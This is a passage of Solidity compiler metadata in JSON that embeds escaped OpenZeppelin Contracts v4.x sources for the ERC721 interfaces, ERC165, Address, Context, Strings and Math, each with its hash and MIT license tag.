{}\\n}\\n\",\"keccak256\":\"0xd89f3585b211fc9e3408384a4c4efdc3a93b2f877a3821046fa01c219d35be1b\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC721/IERC721.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC721/IERC721.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../../utils/introspection/IERC165.sol\\\";\\n\\n/**\\n * @dev Required interface of an ERC721 compliant contract.\\n */\\ninterface IERC721 is IERC165 {\\n    /**\\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\\n\\n    /**\\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\\n     */\\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\\n\\n    /**\\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\\n     */\\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\\n\\n    /**\\n     * @dev Returns the number of tokens in ``owner``'s account.\\n     */\\n    function balanceOf(address owner) external view returns (uint256 balance);\\n\\n    /**\\n     * @dev Returns the owner of the `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function ownerOf(uint256 tokenId) external view returns (address owner);\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external;\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Transfers `tokenId` token from `from` to `to`.\\n     *\\n     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721\\n     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must\\n     * understand this adds an external call which potentially creates a reentrancy vulnerability.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\\n     * The approval is cleared when the token is transferred.\\n     *\\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\\n     *\\n     * Requirements:\\n     *\\n     * - The caller must own the token or be an approved operator.\\n     * - `tokenId` must exist.\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address to, uint256 tokenId) external;\\n\\n    /**\\n     * @dev Approve or remove `operator` as an operator for the caller.\\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\\n     *\\n     * Requirements:\\n     *\\n     * - The `operator` cannot be the caller.\\n     *\\n     * Emits an {ApprovalForAll} event.\\n     */\\n    function setApprovalForAll(address operator, bool _approved) external;\\n\\n    /**\\n     * @dev Returns the account approved for `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function getApproved(uint256 tokenId) external view returns (address operator);\\n\\n    /**\\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\\n     *\\n     * See {setApprovalForAll}\\n     */\\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\\n}\\n\",\"keccak256\":\"0xab28a56179c1db258c9bf5235b382698cb650debecb51b23d12be9e241374b68\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @title ERC721 token receiver interface\\n * @dev Interface for any contract that wants to support safeTransfers\\n * from ERC721 asset contracts.\\n */\\ninterface IERC721Receiver {\\n    /**\\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\\n     * by `operator` from `from`, this function is called.\\n     *\\n     * It must return its Solidity selector to confirm the token transfer.\\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.\\n     *\\n     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\\n     */\\n    function onERC721Received(\\n        address operator,\\n        address from,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external returns (bytes4);\\n}\\n\",\"keccak256\":\"0xa82b58eca1ee256be466e536706850163d2ec7821945abd6b4778cfb3bee37da\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../IERC721.sol\\\";\\n\\n/**\\n * @title ERC-721 Non-Fungible Token Standard, optional metadata extension\\n * @dev See https://eips.ethereum.org/EIPS/eip-721\\n */\\ninterface IERC721Metadata is IERC721 {\\n    /**\\n     * @dev Returns the token collection name.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the token collection symbol.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.\\n     */\\n    function tokenURI(uint256 tokenId) external view returns (string memory);\\n}\\n\",\"keccak256\":\"0x75b829ff2f26c14355d1cba20e16fe7b29ca58eb5fef665ede48bc0f9c6c74b9\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Address.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)\\n\\npragma solidity ^0.8.1;\\n\\n/**\\n * @dev Collection of functions related to the address type\\n */\\nlibrary Address {\\n    /**\\n     * @dev Returns true if `account` is a contract.\\n     *\\n     * [IMPORTANT]\\n     * ====\\n     * It is unsafe to assume that an address for which this function returns\\n     * false is an externally-owned account (EOA) and not a contract.\\n     *\\n     * Among others, `isContract` will return false for the following\\n     * types of addresses:\\n     *\\n     *  - an externally-owned account\\n     *  - a contract in construction\\n     *  - an address where a contract will be created\\n     *  - an address where a contract lived, but was destroyed\\n     * ====\\n     *\\n     * [IMPORTANT]\\n     * ====\\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\\n     *\\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\\n     * constructor.\\n     * ====\\n     */\\n    function isContract(address account) internal view returns (bool) {\\n        // This method relies on extcodesize/address.code.length, which returns 0\\n        // for contracts in construction, since the code is only stored at the end\\n        // of the constructor execution.\\n\\n        return account.code.length > 0;\\n    }\\n\\n    /**\\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\\n     * `recipient`, forwarding all available gas and reverting on errors.\\n     *\\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\\n     * imposed by `transfer`, making them unable to receive funds via\\n     * `transfer`. {sendValue} removes this limitation.\\n     *\\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\\n     *\\n     * IMPORTANT: because control is transferred to `recipient`, care must be\\n     * taken to not create reentrancy vulnerabilities. Consider using\\n     * {ReentrancyGuard} or the\\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\\n     */\\n    function sendValue(address payable recipient, uint256 amount) internal {\\n        require(address(this).balance >= amount, \\\"Address: insufficient balance\\\");\\n\\n        (bool success, ) = recipient.call{value: amount}(\\\"\\\");\\n        require(success, \\\"Address: unable to send value, recipient may have reverted\\\");\\n    }\\n\\n    /**\\n     * @dev Performs a Solidity function call using a low level `call`. A\\n     * plain `call` is an unsafe replacement for a function call: use this\\n     * function instead.\\n     *\\n     * If `target` reverts with a revert reason, it is bubbled up by this\\n     * function (like regular Solidity function calls).\\n     *\\n     * Returns the raw returned data. To convert to the expected return value,\\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\\n     *\\n     * Requirements:\\n     *\\n     * - `target` must be a contract.\\n     * - calling `target` with `data` must not revert.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, 0, \\\"Address: low-level call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\\n     * `errorMessage` as a fallback revert reason when `target` reverts.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, 0, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but also transferring `value` wei to `target`.\\n     *\\n     * Requirements:\\n     *\\n     * - the calling contract must have an ETH balance of at least `value`.\\n     * - the called Solidity function must be `payable`.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCallWithValue(\\n        address target,\\n        bytes memory data,\\n        uint256 value\\n    ) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, value, \\\"Address: low-level call with value failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCallWithValue(\\n        address target,\\n        bytes memory data,\\n        uint256 value,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        require(address(this).balance >= value, \\\"Address: insufficient balance for call\\\");\\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but performing a static call.\\n     *\\n     * _Available since v3.3._\\n     */\\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\\n        return functionStaticCall(target, data, \\\"Address: low-level static call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\\n     * but performing a static call.\\n     *\\n     * _Available since v3.3._\\n     */\\n    function functionStaticCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal view returns (bytes memory) {\\n        (bool success, bytes memory returndata) = target.staticcall(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but performing a delegate call.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\\n        return functionDelegateCall(target, data, \\\"Address: low-level delegate call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\\n     * but performing a delegate call.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function functionDelegateCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        (bool success, bytes memory returndata) = target.delegatecall(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling\\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\\n     *\\n     * _Available since v4.8._\\n     */\\n    function verifyCallResultFromTarget(\\n        address target,\\n        bool success,\\n        bytes memory returndata,\\n        string memory errorMessage\\n    ) internal view returns (bytes memory) {\\n        if (success) {\\n            if (returndata.length == 0) {\\n                // only check isContract if the call was successful and the return data is empty\\n                // otherwise we already know that it was a contract\\n                require(isContract(target), \\\"Address: call to non-contract\\\");\\n            }\\n            return returndata;\\n        } else {\\n            _revert(returndata, errorMessage);\\n        }\\n    }\\n\\n    /**\\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\\n     * revert reason or using the provided one.\\n     *\\n     * _Available since v4.3._\\n     */\\n    function verifyCallResult(\\n        bool success,\\n        bytes memory returndata,\\n        string memory errorMessage\\n    ) internal pure returns (bytes memory) {\\n        if (success) {\\n            return returndata;\\n        } else {\\n            _revert(returndata, errorMessage);\\n        }\\n    }\\n\\n    function _revert(bytes memory returndata, string memory errorMessage) private pure {\\n        // Look for revert reason and bubble it up if present\\n        if (returndata.length > 0) {\\n            // The easiest way to bubble the revert reason is using memory via assembly\\n            /// @solidity memory-safe-assembly\\n            assembly {\\n                let returndata_size := mload(returndata)\\n                revert(add(32, returndata), returndata_size)\\n            }\\n        } else {\\n            revert(errorMessage);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xf96f969e24029d43d0df89e59d365f277021dac62b48e1c1e3ebe0acdd7f1ca1\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Strings.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/Strings.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./math/Math.sol\\\";\\n\\n/**\\n * @dev String operations.\\n */\\nlibrary Strings {\\n    bytes16 private constant _SYMBOLS = \\\"0123456789abcdef\\\";\\n    uint8 private constant _ADDRESS_LENGTH = 20;\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\\n     */\\n    function toString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            uint256 length = Math.log10(value) + 1;\\n            string memory buffer = new string(length);\\n            uint256 ptr;\\n            /// @solidity memory-safe-assembly\\n            assembly {\\n                ptr := add(buffer, add(32, length))\\n            }\\n            while (true) {\\n                ptr--;\\n                /// @solidity memory-safe-assembly\\n                assembly {\\n                    mstore8(ptr, byte(mod(value, 10), _SYMBOLS))\\n                }\\n                value /= 10;\\n                if (value == 0) break;\\n            }\\n            return buffer;\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            return toHexString(value, Math.log256(value) + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\\n     */\\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\\n        bytes memory buffer = new bytes(2 * length + 2);\\n        buffer[0] = \\\"0\\\";\\n        buffer[1] = \\\"x\\\";\\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\\n            buffer[i] = _SYMBOLS[value & 0xf];\\n            value >>= 4;\\n        }\\n        require(value == 0, \\\"Strings: hex length insufficient\\\");\\n        return string(buffer);\\n    }\\n\\n    /**\\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(address addr) internal pure returns (string memory) {\\n        return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);\\n    }\\n}\\n\",\"keccak256\":\"0xa4d1d62251f8574deb032a35fc948386a9b4de74b812d4f545a1ac120486b48a\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/introspection/ERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./IERC165.sol\\\";\\n\\n/**\\n * @dev Implementation of the {IERC165} interface.\\n *\\n * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check\\n * for the additional interface id that will be supported. For example:\\n *\\n * ```solidity\\n * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\\n *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);\\n * }\\n * ```\\n *\\n * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.\\n */\\nabstract contract ERC165 is IERC165 {\\n    /**\\n     * @dev See {IERC165-supportsInterface}.\\n     */\\n    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\\n        return interfaceId == type(IERC165).interfaceId;\\n    }\\n}\\n\",\"keccak256\":\"0xd10975de010d89fd1c78dc5e8a9a7e7f496198085c151648f20cba166b32582b\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/introspection/IERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC165 standard, as defined in the\\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\\n *\\n * Implementers can declare support of contract interfaces, which can then be\\n * queried by others ({ERC165Checker}).\\n *\\n * For an implementation, see {ERC165}.\\n */\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\",\"keccak256\":\"0x447a5f3ddc18419d41ff92b3773fb86471b1db25773e07f877f548918a185bf1\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/Math.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/Math.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Standard math utilities missing in the Solidity language.\\n */\\nlibrary Math {\\n    enum Rounding {\\n        Down, // Toward negative infinity\\n        Up, // Toward infinity\\n        Zero // Toward zero\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two numbers.\\n     */\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a > b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two numbers.\\n     */\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a < b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the average of two numbers. The result is rounded towards\\n     * zero.\\n     */\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b) / 2 can overflow.\\n        return (a & b) + (a ^ b) / 2;\\n    }\\n\\n    /**\\n     * @dev Returns the ceiling of the division of two numbers.\\n     *\\n     * This differs from standard division with `/` in that it rounds up instead\\n     * of rounding down.\\n     */\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b - 1) / b can overflow on addition, so we distribute.\\n        return a == 0 ? 0 : (a - 1) / b + 1;\\n    }\\n\\n    /**\\n     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0\\n     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)\\n     * with further edits by Uniswap Labs also under MIT license.\\n     */\\n    function mulDiv(\\n        uint256 x,\\n        uint256 y,\\n        uint256 denominator\\n    ) internal pure returns (uint256 result) {\\n        unchecked {\\n            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use\\n            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\n            // variables such that product = prod1 * 2^256 + prod0.\\n            uint256 prod0; // Least significant 256 bits of the product\\n            uint256 prod1; // Most significant 256 bits of the product\\n            assembly {\\n                let mm := mulmod(x, y, not(0))\\n                prod0 := mul(x, y)\\n                prod1 := sub(sub(mm, prod0), lt(mm, prod0))\\n            }\\n\\n            // Handle non-overflow cases, 256 by 256 division.\\n            if (prod1 == 0) {\\n                return prod0 / denominator;\\n            }\\n\\n            // Make sure the result is less than 2^256. Also prevents denominator == 0.\\n            require(denominator > prod1);\\n\\n            ///////////////////////////////////////////////\\n            // 512 by 256 division.\\n            ///////////////////////////////////////////////\\n\\n            // Make division exact by subtracting the remainder from [prod1 prod0].\\n            uint256 remainder;\\n            assembly {\\n                // Compute remainder using mulmod.\\n                remainder := mulmod(x, y, denominator)\\n\\n                // Subtract 256 bit number from 512 bit number.\\n                prod1 := sub(prod1, gt(remainder, prod0))\\n                prod0 := sub(prod0, remainder)\\n            }\\n\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.\\n            // See https://cs.stackexchange.com/q/138556/92363.\\n\\n            // Does not overflow because the denominator cannot be zero at this stage in the function.\\n            uint256 twos = denominator & (~denominator + 1);\\n            assembly {\\n                // Divide denominator by twos.\\n                denominator := div(denominator, twos)\\n\\n                // Divide [prod1 prod0] by twos.\\n                prod0 := div(prod0, twos)\\n\\n                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.\\n                twos := add(div(sub(0, twos), twos), 1)\\n            }\\n\\n            // Shift in bits from prod1 into prod0.\\n            prod0 |= prod1 * twos;\\n\\n            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such\\n            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for\\n            // four bits. That is, denominator * inv = 1 mod 2^4.\\n            uint256 inverse = (3 * denominator) ^ 2;\\n\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works\\n            // in modular arithmetic, doubling the correct bits in each step.\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^8\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^16\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^32\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^64\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^128\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^256\\n\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\n            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is\\n            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1\\n            // is no longer required.\\n            result = prod0 * inverse;\\n            return result;\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.\\n     */\\n    function mulDiv(\\n        uint256 x,\\n        uint256 y,\\n        uint256 denominator,\\n        Rounding rounding\\n    ) internal pure returns (uint256) {\\n        uint256 result = mulDiv(x, y, denominator);\\n        if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {\\n            result += 1;\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.\\n     *\\n     * Inspired by Henry S. Warren, Jr.'s \\\"Hacker's Delight\\\" (Chapter 11).\\n     */\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n\\n        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.\\n        //\\n        // We know that the \\\"msb\\\" (most significant bit) of our target number `a` is a power of 2 such that we have\\n        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.\\n        //\\n        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`\\n        // \\u2192 `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`\\n        // \\u2192 `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\\n        //\\n        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\\n        uint256 result = 1 << (log2(a) >> 1);\\n\\n        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,\\n        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at\\n        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision\\n        // into the expected uint128 result.\\n        unchecked {\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            return min(result, a / result);\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates sqrt(a), following the selected rounding direction.\\n     */\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = sqrt(a);\\n            return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 128;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 64;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 32;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 16;\\n            }\\n            if (value >> 8 > 0) {\\n                value >>= 8;\\n                result += 8;\\n            }\\n            if (value >> 4 > 0) {\\n                value >>= 4;\\n                result += 4;\\n            }\\n            if (value >> 2 > 0) {\\n                value >>= 2;\\n                result += 2;\\n            }\\n            if (value >> 1 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log2(value);\\n            return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >= 10**64) {\\n                value /= 10**64;\\n                result += 64;\\n            }\\n            if (value >= 10**32) {\\n                value /= 10**32;\\n                result += 32;\\n            }\\n            if (value >= 10**16) {\\n                value /= 10**16;\\n                result += 16;\\n            }\\n            if (value >= 10**8) {\\n                value /= 10**8;\\n                result += 8;\\n            }\\n            if (value >= 10**4) {\\n                value /= 10**4;\\n                result += 4;\\n            }\\n            if (value >= 10**2) {\\n                value /= 10**2;\\n                result += 2;\\n            }\\n            if (value >= 10**1) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log10(value);\\n            return result + (rounding == Rounding.Up && 10**result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     *\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\n     */\\n    function log256(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 16;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 8;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 4;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 2;\\n            }\\n            if (value >> 8 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log256(uint256 